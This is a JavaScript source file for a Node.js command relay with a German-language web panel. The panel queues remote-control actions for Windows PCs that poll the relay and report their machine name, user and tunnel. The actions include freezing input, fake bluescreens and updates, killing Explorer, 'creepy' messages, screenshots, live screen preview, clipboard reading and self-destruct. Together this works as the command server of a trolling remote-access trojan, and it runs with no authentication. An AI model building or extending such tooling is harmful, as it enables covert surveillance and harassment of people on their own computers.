// relay.js - Relay + Fernbedienung fuer alle Funktionen der PC-App
const http = require('http');

const CATALOG = [{"tab":"quick","tabName":"Quick","card":"Schnellzugriff","action":"lock","label":"0/3Bildschirm sperren"},{"tab":"quick","tabName":"Quick","card":"Mehr Aktionen","action":"desktop","label":"Desktop zeigen (alles minimieren)"},{"tab":"quick","tabName":"Quick","card":"Mehr Aktionen","action":"sleep","label":"Schlafmodus"},{"tab":"quick","tabName":"Quick","card":"Mehr Aktionen","action":"shutdown","label":"Herunterfahren"},{"tab":"quick","tabName":"Quick","card":"System","action":"ping","label":"Verbindung testen"},{"tab":"maus","tabName":"Maus","card":"Live-Touchpad","action":"mouseLeft","label":"Linksklick"},{"tab":"maus","tabName":"Maus","card":"Live-Touchpad","action":"mouseMiddle","label":"Mittelklick"},{"tab":"maus","tabName":"Maus","card":"Live-Touchpad","action":"mouseRight","label":"Rechtsklick"},{"tab":"maus","tabName":"Maus","card":"Live-Touchpad","action":"mouseDouble","label":"Doppelklick"},{"tab":"maus","tabName":"Maus","card":"Live-Touchpad","action":"scrollUp","label":"\u0026#8593; Hochscrollen"},{"tab":"maus","tabName":"Maus","card":"Live-Touchpad","action":"scrollDown","label":"\u0026#8595; Runterscrollen"},{"tab":"maus","tabName":"Maus","card":"Intensitaet","action":"stopAll","label":"Alle Effekte stoppen (Panik-Knopf)"},{"tab":"maus","tabName":"Maus","card":"Maus-Einstellungen (Registry)","action":"mouseSpeedMin","label":"Mausgeschwindigkeit auf Minimum"},{"tab":"maus","tabName":"Maus","card":"Maus-Einstellungen (Registry)","action":"mouseSpeedNormal","label":"\u0026#8617; Mausgeschwindigkeit normal"},{"tab":"maus","tabName":"Maus","card":"Maus-Einstellungen (Registry)","action":"swapButtons","label":"Maustasten vertauschen"},{"tab":"maus","tabName":"Maus","card":"Maus-Einstellungen (Registry)","action":"swapButtonsOff","label":"\u0026#8617; Maustasten zuruecktauschen"},{"tab":"tastatur","tabName":"Tastatur","card":"Custom Text tippen","action":"typeText","label":"Text senden"},{"tab":"tastatur","tabName":"Tastatur","card":"Creepy-Nachricht","action":"iSeeYou","label":"Nachricht tippen"},{"tab":"tastatur","tabName":"Tastatur","card":"Tastatur-Streiche","action":"layoutSwap","label":"Tastatur-Layout wechseln (Y/Z)"},{"tab":"tastatur","tabName":"Tastatur","card":"Tastatur-Streiche","action":"overwrite","label":"Ueberschreib-Modus (Einfg)"},{"tab":"tastatur","tabName":"Tastatur","card":"Tastatur-Streiche","action":"doubleSpace","label":"Doppel-Leerzeichen"},{"tab":"tastatur","tabName":"Tastatur","card":"Tastatur-Streiche","action":"corruptor","label":"Text-Korruptor (Sonderzeichen)"},{"tab":"tastatur","tabName":"Tastatur","card":"Spass-Funktionen","action":"capsToggle","label":"Caps Lock umschalten"},{"tab":"tastatur","tabName":"Tastatur","card":"Spass-Funktionen","action":"randomKey","label":"Zufaellige Taste tippen"},{"tab":"tastatur","tabName":"Tastatur","card":"Spass-Funktionen","action":"altF4","label":"Fenster schliessen (Alt+F4)"},{"tab":"tastatur","tabName":"Tastatur","card":"Tasten-Befehle","action":"save","label":"Speichern (Strg+S)"},{"tab":"tastatur","tabName":"Tastatur","card":"Tasten-Befehle","action":"undo","label":"Rueckgaengig (Strg+Z)"},{"tab":"tastatur","tabName":"Tastatur","card":"Tasten-Befehle","action":"selectAllSpace","label":"Alles markieren + Leerzeichen"},{"tab":"system","tabName":"System","card":"Erschrecken","action":"fakeBsod","label":"Fake Bluescreen (gesperrt)"},{"tab":"system","tabName":"System","card":"Erschrecken","action":"fakeUpdate","label":"Fake Windows-Update"},{"tab":"system","tabName":"System","card":"Erschrecken","action":"blackout","label":"Dauer-Blackout"},{"tab":"system","tabName":"System","card":"Erschrecken","action":"speechLoop","label":"Sprach-Schleife (dauerhaft)"},{"tab":"system","tabName":"System","card":"Erschrecken","action":"hideCursor","label":"Mauszeiger verstecken"},{"tab":"system","tabName":"System","card":"Erschrecken","action":"showCursor","label":"Mauszeiger wieder zeigen"},{"tab":"system","tabName":"System","card":"Erschrecken","action":"freezeInput","label":"Eingabe einfrieren"},{"tab":"system","tabName":"System","card":"Erschrecken","action":"unfreezeInput","label":"Eingabe wieder freigeben"},{"tab":"system","tabName":"System","card":"Erschrecken","action":"killExplorer","label":"Explorer killen"},{"tab":"system","tabName":"System","card":"Erschrecken","action":"restartExplorer","label":"Explorer neu starten"},{"tab":"system","tabName":"System","card":"Erschrecken","action":"volumeMax","label":"Lautstärke max"},{"tab":"system","tabName":"System","card":"Erschrecken","action":"openCmd","label":"CMD öffnen"},{"tab":"system","tabName":"System","card":"Bildschirm \u0026 Desktop","action":"rotate","label":"Bildschirm drehen (nur Intel-Grafik)"},{"tab":"system","tabName":"System","card":"Bildschirm \u0026 Desktop","action":"virtDesktop","label":"Neuer leerer Desktop"},{"tab":"system","tabName":"System","card":"Bildschirm \u0026 Desktop","action":"winPSecond","label":"Nur Zweitbildschirm"},{"tab":"system","tabName":"System","card":"Bildschirm \u0026 Desktop","action":"secondScreenBack","label":"\u0026#8617; Zurueck (beide Bildschirme)"},{"tab":"system","tabName":"System","card":"Bildschirm \u0026 Desktop","action":"peekDesktop","label":"Desktop kurz zeigen (Win+,)"},{"tab":"system","tabName":"System","card":"Bildschirm \u0026 Desktop","action":"gfxReset","label":"Grafiktreiber zuruecksetzen"},{"tab":"system","tabName":"System","card":"Fenster \u0026 Prozesse","action":"winELoop","label":"Explorer-Flut (Win+E x10)"},{"tab":"system","tabName":"System","card":"Fenster \u0026 Prozesse","action":"taskMgr","label":"Task-Manager (Strg+Umsch+Esc)"},{"tab":"system","tabName":"System","card":"Fenster \u0026 Prozesse","action":"printDialog","label":"Druckdialog (Strg+P)"},{"tab":"system","tabName":"System","card":"Gaming / Aufnahme","action":"gameBar","label":"Game Bar oeffnen (Win+G)"},{"tab":"system","tabName":"System","card":"Gaming / Aufnahme","action":"xboxRecord","label":"Xbox-Aufnahme (Win+Alt+R)"},{"tab":"windows","tabName":"Windows","card":"Barrierefreiheit-Streiche","action":"stickyKeys","label":"Sticky Keys aktivieren"},{"tab":"windows","tabName":"Windows","card":"Barrierefreiheit-Streiche","action":"stickyOff","label":"\u0026#8617; Sticky Keys aus"},{"tab":"windows","tabName":"Windows","card":"Barrierefreiheit-Streiche","action":"filterKeys","label":"Filter Keys aktivieren"},{"tab":"windows","tabName":"Windows","card":"Barrierefreiheit-Streiche","action":"filterOff","label":"\u0026#8617; Filter Keys ausschalten"},{"tab":"windows","tabName":"Windows","card":"Barrierefreiheit-Streiche","action":"mouseKeys","label":"MouseKeys aktivieren"},{"tab":"windows","tabName":"Windows","card":"Barrierefreiheit-Streiche","action":"mouseKeysOff","label":"\u0026#8617; MouseKeys aus"},{"tab":"windows","tabName":"Windows","card":"Barrierefreiheit-Streiche","action":"narrator","label":"Sprachausgabe an/aus (Win+Strg+Enter)"},{"tab":"windows","tabName":"Windows","card":"Barrierefreiheit-Streiche","action":"highContrast","label":"Hoher Kontrast an/aus (Alt+Umsch+Druck)"},{"tab":"windows","tabName":"Windows","card":"Werkzeuge einblenden","action":"osk","label":"Bildschirmtastatur (Win+Strg+O)"},{"tab":"windows","tabName":"Windows","card":"Werkzeuge einblenden","action":"magnifier","label":"Lupe / Zoom (Win++)"},{"tab":"windows","tabName":"Windows","card":"Werkzeuge einblenden","action":"magnifierClose","label":"\u0026#8617; Lupe schliessen"},{"tab":"windows","tabName":"Windows","card":"Werkzeuge einblenden","action":"printScreen","label":"Screenshot in Zwischenablage (Druck)"},{"tab":"browser","tabName":"Browser","card":"Suche starten","action":"browserSearch","label":"Im Browser suchen (Strg+L)"},{"tab":"browser","tabName":"Browser","card":"Browser-Streiche","action":"browserBack","label":"Zurueck (Alt+Links)"},{"tab":"browser","tabName":"Browser","card":"Browser-Streiche","action":"reopenTab","label":"Tab wieder oeffnen"},{"tab":"browser","tabName":"Browser","card":"Browser-Streiche","action":"closeTab","label":"Tab schliessen"},{"tab":"browser","tabName":"Browser","card":"Browser-Streiche","action":"zoomOut","label":"Zoom auf 25%"},{"tab":"browser","tabName":"Browser","card":"Browser-Streiche","action":"history","label":"Verlauf"},{"tab":"browser","tabName":"Browser","card":"Browser-Streiche","action":"downloads","label":"Downloads"},{"tab":"browser","tabName":"Browser","card":"Browser-Streiche","action":"ytRestart","label":"YouTube Neustart (0)"},{"tab":"browser","tabName":"Browser","card":"Multimedia","action":"mediaPlayPause","label":"Play/Pause"},{"tab":"browser","tabName":"Browser","card":"Multimedia","action":"mediaNext","label":"Naechster"},{"tab":"browser","tabName":"Browser","card":"Multimedia","action":"mediaPrev","label":"Vorheriger"},{"tab":"browser","tabName":"Browser","card":"Multimedia","action":"mediaMute","label":"Stumm"},{"tab":"browser","tabName":"Browser","card":"Multimedia","action":"volUp","label":"Lauter"},{"tab":"browser","tabName":"Browser","card":"Multimedia","action":"volDown","label":"Leiser"},{"tab":"extras","tabName":"Extras","card":"Desktops \u0026 Fenster","action":"desktopPrev","label":"← Desktop links"},{"tab":"extras","tabName":"Extras","card":"Desktops \u0026 Fenster","action":"desktopNext","label":"Desktop rechts →"},{"tab":"extras","tabName":"Extras","card":"Desktops \u0026 Fenster","action":"desktopClose","label":"Desktop schließen"},{"tab":"extras","tabName":"Extras","card":"Desktops \u0026 Fenster","action":"browserFullscreen","label":"Vollbild · F11"},{"tab":"extras","tabName":"Extras","card":"Desktops \u0026 Fenster","action":"cancelShutdown","label":"Shutdown abbrechen"},{"tab":"extras","tabName":"Extras","card":"Bildschirm-Vorschau","action":"screenshotView","label":"Screenshot anzeigen"},{"tab":"extras","tabName":"Extras","card":"Bildschirm-Vorschau","action":"livePreview","label":"Live-Vorschau starten"},{"tab":"extras","tabName":"Extras","card":"Fenster-Fernbedienung","action":"windowList","label":"Fensterliste aktualisieren"},{"tab":"extras","tabName":"Extras","card":"Fenster-Fernbedienung","action":"windowFocus","label":"Nach vorne holen"},{"tab":"extras","tabName":"Extras","card":"Fenster-Fernbedienung","action":"windowMinimize","label":"Minimieren"},{"tab":"extras","tabName":"Extras","card":"Fenster-Fernbedienung","action":"windowMaximize","label":"Maximieren"},{"tab":"extras","tabName":"Extras","card":"Fenster-Fernbedienung","action":"windowRestore","label":"Normal anzeigen"},{"tab":"extras","tabName":"Extras","card":"Fenster-Fernbedienung","action":"minimizeAll","label":"Alle minimieren"},{"tab":"extras","tabName":"Extras","card":"Fenster-Fernbedienung","action":"restoreAll","label":"Alle zurückholen"},{"tab":"extras","tabName":"Extras","card":"Fenster-Fernbedienung","action":"windowSnapLeft","label":"← Links anordnen"},{"tab":"extras","tabName":"Extras","card":"Fenster-Fernbedienung","action":"windowSnapRight","label":"Rechts anordnen →"},{"tab":"extras","tabName":"Extras","card":"Fenster-Fernbedienung","action":"windowMonitorNext","label":"Nächster Monitor"},{"tab":"extras","tabName":"Extras","card":"Text zwischen Handy \u0026 PC","action":"clipboardRead","label":"Vom PC lesen"},{"tab":"extras","tabName":"Extras","card":"Text zwischen Handy \u0026 PC","action":"clipboardWrite","label":"An PC senden"},{"tab":"extras","tabName":"Extras","card":"Vollbild auf dem PC","action":"showMessage","label":"Nachricht anzeigen"},{"tab":"extras","tabName":"Extras","card":"Vollbild auf dem PC","action":"screenBlank","label":"Schwarzer Bildschirm"},{"tab":"extras","tabName":"Extras","card":"Vollbild auf dem PC","action":"desktopClock","label":"Große Uhr"},{"tab":"extras","tabName":"Extras","card":"Vollbild auf dem PC","action":"countdown","label":"Countdown starten"},{"tab":"extras","tabName":"Extras","card":"Vollbild auf dem PC","action":"screenColor","label":"Farbtest anzeigen"},{"tab":"extras","tabName":"Extras","card":"Vollbild auf dem PC","action":"closeOverlays","label":"Alle Vollbild-Anzeigen schließen"},{"tab":"extras","tabName":"Extras","card":"Browser-Fernbedienung","action":"browserNewTab","label":"＋ Neuer Tab"},{"tab":"extras","tabName":"Extras","card":"Browser-Fernbedienung","action":"tabPrev","label":"← Vorheriger Tab"},{"tab":"extras","tabName":"Extras","card":"Browser-Fernbedienung","action":"tabNext","label":"Nächster Tab →"},{"tab":"extras","tabName":"Extras","card":"Browser-Fernbedienung","action":"browserRefresh","label":"Seite neu laden"},{"tab":"extras","tabName":"Extras","card":"Browser-Fernbedienung","action":"browserHardRefresh","label":"Ohne Cache laden"},{"tab":"extras","tabName":"Extras","card":"Browser-Fernbedienung","action":"browserZoomIn","label":"Zoom ＋"},{"tab":"extras","tabName":"Extras","card":"Browser-Fernbedienung","action":"browserZoomReset","label":"Zoom 100 %"},{"tab":"extras","tabName":"Extras","card":"Schnelle Tools","action":"openExplorer","label":"Explorer"},{"tab":"extras","tabName":"Extras","card":"Schnelle Tools","action":"openCalculator","label":"Rechner"},{"tab":"extras","tabName":"Extras","card":"Schnelle Tools","action":"openNotepad","label":"Editor"},{"tab":"extras","tabName":"Extras","card":"Schnelle Tools","action":"openSettings","label":"Einstellungen"},{"tab":"extras","tabName":"Extras","card":"Schnelle Tools","action":"emojiPanel","label":"Emoji-Auswahl"},{"tab":"extras","tabName":"Extras","card":"Schnelle Tools","action":"snippingTool","label":"Bildschirmausschnitt"},{"tab":"extras","tabName":"Extras","card":"Schnelle Tools","action":"pasteClipboard","label":"PC-Text einfügen"},{"tab":"extras","tabName":"Extras","card":"Schnelle Tools","action":"mediaStop","label":"Medien stoppen"},{"tab":"extras","tabName":"Extras","card":"PC-Status","action":"pcStats","label":"Auslastung anzeigen"},{"tab":"extras","tabName":"Extras","card":"Anwendung öffnen","action":"launchApp","label":"Ausgewählte Anwendung öffnen"},{"tab":"extras","tabName":"Extras","card":"Neu · System-Streiche","action":"taskbarAutoHide","label":"Taskleiste verschwinden lassen"},{"tab":"extras","tabName":"Extras","card":"Neu · System-Streiche","action":"taskbarRestore","label":"Taskleiste zurück"},{"tab":"extras","tabName":"Extras","card":"Neu · System-Streiche","action":"wallpaperTroll","label":"Hintergrund ersetzen"},{"tab":"extras","tabName":"Extras","card":"Neu · System-Streiche","action":"wallpaperRestore","label":"Hintergrund zurück"},{"tab":"extras","tabName":"Extras","card":"Neu · System-Streiche","action":"magnifierInvert","label":"Farben invertieren (Lupe)"},{"tab":"extras","tabName":"Extras","card":"Neu · Einstellungen \u0026 Tools","action":"cursorBig","label":"Cursor 48 px"},{"tab":"extras","tabName":"Extras","card":"Neu · Einstellungen \u0026 Tools","action":"screensaverNow","label":"Bildschirmschoner jetzt"},{"tab":"extras","tabName":"Extras","card":"Neu · Einstellungen \u0026 Tools","action":"taskViewToggle","label":"Task-Ansicht"},{"tab":"extras","tabName":"Extras","card":"Neu · Einstellungen \u0026 Tools","action":"keepAwake","label":"Wachhalten an (30 min)"},{"tab":"extras","tabName":"Extras","card":"Neu · Einstellungen \u0026 Tools","action":"keepAwakeOff","label":"↺ Wachhalten aus"},{"tab":"extras","tabName":"Extras","card":"Neu · Einstellungen \u0026 Tools","action":"openDownloadsFolder","label":"Downloads-Ordner"},{"tab":"extras","tabName":"Extras","card":"Neu · Einstellungen \u0026 Tools","action":"openTempFolder","label":"Temp-Ordner"},{"tab":"extras","tabName":"Extras","card":"Neu · Einstellungen \u0026 Tools","action":"setSound","label":"Sound-Einstellungen"},{"tab":"extras","tabName":"Extras","card":"Neu · Einstellungen \u0026 Tools","action":"setDisplay","label":"Anzeige-Einstellungen"},{"tab":"extras","tabName":"Extras","card":"Neu · Einstellungen \u0026 Tools","action":"setBluetooth","label":"Bluetooth-Einstellungen"},{"tab":"extras","tabName":"Extras","card":"Neu · Einstellungen \u0026 Tools","action":"setNetwork","label":"Netzwerk-Einstellungen"},{"tab":"extras","tabName":"Extras","card":"Neu · Einstellungen \u0026 Tools","action":"setPrivacy","label":"Datenschutz-Einstellungen"},{"tab":"extras","tabName":"Extras","card":"Neu · Einstellungen \u0026 Tools","action":"setApps","label":"App-Verwaltung"},{"tab":"extras","tabName":"Extras","card":"Neu · Einstellungen \u0026 Tools","action":"setUpdate","label":"Windows-Update"},{"tab":"extras","tabName":"Extras","card":"Neu · Einstellungen \u0026 Tools","action":"setAbout","label":"Systeminfo"},{"tab":"extras","tabName":"Extras","card":"Neu · Einstellungen \u0026 Tools","action":"setPrinters","label":"Drucker"},{"tab":"extras","tabName":"Extras","card":"Neu · Einstellungen \u0026 Tools","action":"setTaskbar","label":"Taskleisten-Einstellungen"},{"tab":"extras","tabName":"Extras","card":"Neu · Einstellungen \u0026 Tools","action":"setDateTime","label":"Datum \u0026 Uhrzeit"},{"tab":"extras","tabName":"Extras","card":"Neu · Einstellungen \u0026 Tools","action":"setPower","label":"Energieoptionen"},{"tab":"extras","tabName":"Extras","card":"Neu · Einstellungen \u0026 Tools","action":"setNotifications","label":"Benachrichtigungen"},{"tab":"extras","tabName":"Extras","card":"Neu · Desktop \u0026 Eingaben","action":"cursorGiant","label":"Riesen-Cursor (96 px)"},{"tab":"extras","tabName":"Extras","card":"Neu · Desktop \u0026 Eingaben","action":"cursorNormal","label":"↺ Cursor normal"},{"tab":"extras","tabName":"Extras","card":"Neu · Desktop \u0026 Eingaben","action":"monitorOff","label":"Monitor ausschalten"},{"tab":"extras","tabName":"Extras","card":"Neu · Desktop \u0026 Eingaben","action":"monitorOn","label":"↺ Monitor an"},{"tab":"extras","tabName":"Extras","card":"Neu · Desktop \u0026 Eingaben","action":"iconsHide","label":"Desktop-Symbole verstecken"},{"tab":"extras","tabName":"Extras","card":"Neu · Desktop \u0026 Eingaben","action":"iconsShow","label":"↺ Symbole zurück"},{"tab":"extras","tabName":"Extras","card":"Neu · Desktop \u0026 Eingaben","action":"winHold","label":"Win-Taste festhalten"},{"tab":"extras","tabName":"Extras","card":"Neu · Desktop \u0026 Eingaben","action":"winRelease","label":"↺ Win-Taste lösen"},{"tab":"extras","tabName":"Extras","card":"Neu · Desktop \u0026 Eingaben","action":"altTabSpam","label":"Alt+Tab-Karussell"},{"tab":"extras","tabName":"Extras","card":"Neu · Desktop \u0026 Eingaben","action":"screenSaverStart","label":"Bildschirmschoner starten"},{"tab":"extras","tabName":"Extras","card":"Neu · Desktop \u0026 Eingaben","action":"clipboardClear","label":"Zwischenablage leeren"},{"tab":"extras","tabName":"Extras","card":"Neu · Desktop \u0026 Eingaben","action":"taskView","label":"Task-Ansicht öffnen"},{"tab":"extras","tabName":"Extras","card":"Neu · Desktop \u0026 Eingaben","action":"typeSpam","label":"Text-Salve (20×)"},{"tab":"extras","tabName":"Extras","card":"Neu · Desktop \u0026 Eingaben","action":"releaseKeys","label":"↺ Alle Tasten lösen"},{"tab":"extras","tabName":"Extras","card":"Neu · Desktop \u0026 Eingaben","action":"mouseWarpCorner","label":"Maus in die Ecke"},{"tab":"extras","tabName":"Extras","card":"Neu · Desktop \u0026 Eingaben","action":"openRegedit","label":"Registry-Editor"},{"tab":"extras","tabName":"Extras","card":"Neu · Desktop \u0026 Eingaben","action":"openControlPanel","label":"Systemsteuerung"},{"tab":"extras","tabName":"Extras","card":"Neu · Desktop \u0026 Eingaben","action":"openEventViewer","label":"Ereignisanzeige"},{"tab":"extras","tabName":"Extras","card":"Neu · Desktop \u0026 Eingaben","action":"openPowerShell","label":"PowerShell öffnen"},{"tab":"extras","tabName":"Extras","card":"Neu · Desktop \u0026 Eingaben","action":"openDeviceManager","label":"Geräte-Manager"},{"tab":"extras","tabName":"Extras","card":"Spaß \u0026 Troll","action":"rickroll","label":"🎵 Never gonna give you up"},{"tab":"extras","tabName":"Extras","card":"Spaß \u0026 Troll","action":"capsSpam","label":"Caps-Lock-Disco"},{"tab":"extras","tabName":"Extras","card":"Spaß \u0026 Troll","action":"mouseShake","label":"Mauszeiger-Karussell"},{"tab":"extras","tabName":"Extras","card":"Spaß \u0026 Troll","action":"numLockParty","label":"Num-Lock-Party"},{"tab":"extras","tabName":"Extras","card":"Spaß \u0026 Troll","action":"volumeParty","label":"Lautstärke-Achterbahn"},{"tab":"extras","tabName":"Extras","card":"Spaß \u0026 Troll","action":"tabSpam","label":"Tab-Feuerwerk"},{"tab":"extras","tabName":"Extras","card":"Selbstzerstörung","action":"selfDestruct","label":"Selbstzerstörung ausführen0/5"}];

const clients = new Map();
const queues = new Map();
const reports = new Map();
const STALE_MS = 90000;

const TEXT_ACTIONS = ['typeText','iSeeYou','showMessage','browserSearch'];

const PAGE = `<!doctype html><html lang="de"><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Panic Relay</title>
<style>
:root{color-scheme:dark}
*{box-sizing:border-box}
body{margin:0;background:#0b0d10;color:#e8edf3;font:15px/1.5 ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,sans-serif;padding:18px 12px 70px}
.wrap{width:min(860px,100%);margin:0 auto}
h1{margin:0 0 2px;font-size:20px}
.sub{color:#7e8b9b;font-size:12px;margin-bottom:16px}
.machines{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:14px}
.machine{display:flex;align-items:center;gap:8px;background:#12161c;border:1px solid #222a34;border-radius:12px;padding:10px 14px;cursor:pointer;font-size:13px}
.machine.sel{border-color:#3ddc97}
.dot{width:8px;height:8px;border-radius:50%;background:#5a6675}
.dot.on{background:#3ddc97}.dot.off{background:#ff5c5c}
.tabs{display:flex;gap:6px;overflow-x:auto;padding-bottom:6px;margin-bottom:12px;border-bottom:1px solid #1d242d}
.tab{padding:9px 13px;border-radius:10px 10px 0 0;background:#12161c;border:1px solid #222a34;border-bottom:none;cursor:pointer;white-space:nowrap;font-size:13px;color:#9aa8b8}
.tab.on{background:#182027;color:#e8edf3;border-color:#2b3542}
.card{background:#12161c;border:1px solid #222a34;border-radius:14px;padding:14px;margin-bottom:10px}
.card-title{font-size:12px;color:#9aa8b8;margin-bottom:10px;letter-spacing:.3px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(158px,1fr));gap:8px}
button{font:inherit;font-size:13px;color:#c8d3e0;background:#1a2028;border:1px solid #2b3542;border-radius:10px;padding:12px 10px;cursor:pointer;text-align:left;line-height:1.25}
button:active{transform:translateY(1px)}
button.warn{border-color:#5a3030;color:#ffb3b3}
button.go{border-color:#274a37;color:#9ff0c4}
input,textarea{width:100%;font:inherit;color:#e8edf3;background:#0e1218;border:1px solid #2b3542;border-radius:10px;padding:10px;margin-top:8px}
.row{display:flex;gap:8px;margin-top:8px}
.row>*{flex:1}
.log{margin-top:10px;color:#7e8b9b;font-size:12px;font-family:ui-monospace,Consolas,monospace;max-height:120px;overflow:auto;white-space:pre-wrap}
.hint{color:#5a6675;font-size:11px;margin-top:6px}
</style>
<div class="wrap">
  <h1>Panic Relay</h1>
  <div class="sub">Rechner waehlen, Funktion auswaehlen. Aktualisiert alle 4 s.</div>
  <div class="machines" id="machines"><div class="card">warte auf Rechner ...</div></div>

  <div id="tabs" class="tabs"></div>
  <div id="content"></div>

  <div class="card">
    <div class="card-title">Eingaben</div>
    <input id="text" placeholder="Text fuer Nachricht / Tippen / Browser-Suche">
    <div class="row">
      <button onclick="send('showMessage',{text:val('text')})">Nachricht anzeigen</button>
      <button onclick="send('typeText',{text:val('text')})">Text tippen</button>
      <button onclick="send('browserSearch',{text:val('text')})">Browser-Suche</button>
    </div>
    <input id="secs" type="number" value="60" min="1" max="600" placeholder="Sekunden">
    <div class="row"><button onclick="send('countdown',{seconds:Number(val('secs'))})">Countdown starten</button></div>
    <textarea id="custom" rows="2" placeholder='{"cmd":"action","action":"lock"}'></textarea>
    <div class="row"><button class="warn" onclick="sendRaw()">Eigenen Befehl senden</button></div>
    <div class="log" id="log"></div>
  </div>
</div>
<script>
var CATALOG = __CATALOG__;
var selected = null, machines = [], currentTab = null;

function esc(s){return String(s).replace(/[&<>"']/g,function(c){return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]})}
function val(id){return document.getElementById(id).value}
function log(msg){var l=document.getElementById('log');l.textContent=(new Date().toLocaleTimeString()+'  '+msg+'\n')+l.textContent;}

function tabs(){var t=[],seen={};for(var i=0;i<CATALOG.length;i++){var c=CATALOG[i];if(!seen[c.tab]){seen[c.tab]=1;t.push(c)}}return t}

async function load(){
  try{
    var r=await fetch('/api/status',{cache:'no-store'});
    var d=await r.json();
    machines=(d.clients||[]).slice().sort(function(a,b){return b.lastSeen-a.lastSeen});
    var box=document.getElementById('machines');
    if(!machines.length){box.innerHTML='<div class="card">noch kein Rechner verbunden</div>';return}
    if(!selected||!machines.some(function(m){return m.machine===selected}))selected=machines[0].machine;
    box.innerHTML=machines.map(function(m){
      return '<div class="machine '+(m.machine===selected?'sel':'')+'" data-m="'+esc(m.machine)+'" onclick="pick(this.dataset.m)">'
        +'<span class="dot '+(m.online?'on':'off')+'"></span><span>'+esc(m.machine)+'</span></div>'
    }).join('');
  }catch(e){log('Relay nicht erreichbar')}
}
function pick(name){selected=name;load()}

function renderTabs(){
  var t=tabs();
  if(!currentTab)currentTab=t[0].tab;
  document.getElementById('tabs').innerHTML=t.map(function(x){
    return '<div class="tab '+(x.tab===currentTab?'on':'')+'" data-t="'+x.tab+'" onclick="setTab(this.dataset.t)">'+esc(x.tabName)+'</div>'
  }).join('');
}
function setTab(t){currentTab=t;renderTabs();renderContent()}

function renderContent(){
  var items=CATALOG.filter(function(c){return c.tab===currentTab});
  var order=[],byCard={};
  items.forEach(function(c){if(!byCard[c.card]){byCard[c.card]=[];order.push(c.card)}byCard[c.card].push(c)});
  document.getElementById('content').innerHTML=order.map(function(card){
    var btns=byCard[card].map(function(c){
      var cls=c.action.indexOf('stop')===0||c.action.indexOf('restore')>0||c.action.indexOf('Restore')>0||c.action==='closeOverlays'?'go':'';
      if(c.label.indexOf('↺')===0)cls='go';
      if(c.action.indexOf('selfDestruct')===0||c.action==='shutdown'||c.action==='fakeBsod'||c.action==='freezeInput')cls='warn';
      return '<button class="'+cls+'" data-a="'+esc(c.action)+'" onclick="send(this.dataset.a)">'+esc(c.label)+'</button>'
    }).join('');
    return '<div class="card"><div class="card-title">'+esc(card)+'</div><div class="grid">'+btns+'</div></div>'
  }).join('');
}

async function post(body){
  if(!selected){log('kein Rechner gewaehlt');return}
  body.machine=selected;
  try{
    var r=await fetch('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
    var d=await r.json();
    log('gesendet: '+(body.action||'?')+' ('+(d.count||0)+' in Warteschlange)');
  }catch(e){log('senden fehlgeschlagen')}
}
function send(action,extra){
  var body={cmd:'action',action:action};
  if(extra)for(var k in extra)body[k]=extra[k];
  if(TEXT_ACTIONS.indexOf(action)>=0&&!body.text)body.text=val('text');
  post(body);
}
function sendRaw(){try{post(JSON.parse(val('custom')))}catch(e){log('kein gueltiges JSON')}}

renderTabs();renderContent();load();setInterval(load,4000);
</script></html>`;

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Auth');
    if (req.method === 'OPTIONS') { res.writeHead(204); return res.end(); }

    let body = '';
    req.on('data', chunk => { if (body.length < 5e6) body += chunk; });
    req.on('end', () => {
        if (req.url === '/' && req.method === 'GET') {
            res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
            return res.end(PAGE.replace('__CATALOG__', JSON.stringify(CATALOG)));
        }
        if (req.url === '/api/report' && req.method === 'POST') {
            try {
                const r = JSON.parse(body);
                const m = (r.machine && String(r.machine).slice(0,64)) || 'unbekannt';
                const list = reports.get(m) || [];
                list.push({ ts: Date.now(), step: String(r.step||'').slice(0,40), msg: String(r.msg||'').slice(0,300) });
                while (list.length > 60) list.shift();
                reports.set(m, list);
                res.writeHead(200, {'Content-Type':'application/json'});
                res.end(JSON.stringify({ok:true, count:list.length}));
            } catch { res.writeHead(400); res.end(); }
        }
        else if (req.url === '/api/command' && req.method === 'POST') {
            try {
                const cmd = JSON.parse(body);
                const target = (cmd.machine && String(cmd.machine).slice(0,64)) || '*';
                const q = queues.get(target) || [];
                q.push(cmd);
                queues.set(target, q);
                res.writeHead(200, {'Content-Type':'application/json'});
                res.end(JSON.stringify({ queued: true, machine: target, count: q.length }));
            } catch { res.writeHead(400); res.end(); }
        }
        else if (req.url === '/api/poll' && req.method === 'POST') {
            let info = {};
            try { info = JSON.parse(body); } catch { info = {}; }
            const machine = (info.machine && String(info.machine).slice(0,64)) || 'unbekannt';
            clients.set(machine, { machine: machine, user: info.user ? String(info.user).slice(0,64) : '', tunnel: info.tunnel ? String(info.tunnel).slice(0,200) : '', timestamp: Date.now() });
            const mine = queues.get(machine) || [];
            const any = queues.get('*') || [];
            queues.set(machine, []);
            queues.set('*', []);
            res.writeHead(200, {'Content-Type':'application/json'});
            res.end(JSON.stringify(mine.concat(any)));
        }
        else if (req.url === '/api/status' && req.method === 'GET') {
            const now = Date.now();
            const all = [...clients.values()].map(c => ({ machine: c.machine, user: c.user, tunnel: c.tunnel, online: now - c.timestamp < STALE_MS, lastSeen: c.timestamp })).sort((a,b) => b.lastSeen - a.lastSeen);
            const newest = all.find(c => c.online) || all[0] || null;
            res.writeHead(200, {'Content-Type':'application/json'});
            res.end(JSON.stringify({ online: !!(newest && newest.online), timestamp: newest ? newest.lastSeen : 0, info: newest ? JSON.stringify(newest) : null,
                clients: all, reports: [...reports.entries()].map(([m,l]) => ({ machine: m, count: l.length, lines: l.slice(-12) })) }));
        } else { res.writeHead(404); res.end(); }
    });
});

server.listen(process.env.PORT || 8080);
console.log('relay listening on', process.env.PORT || 8080);
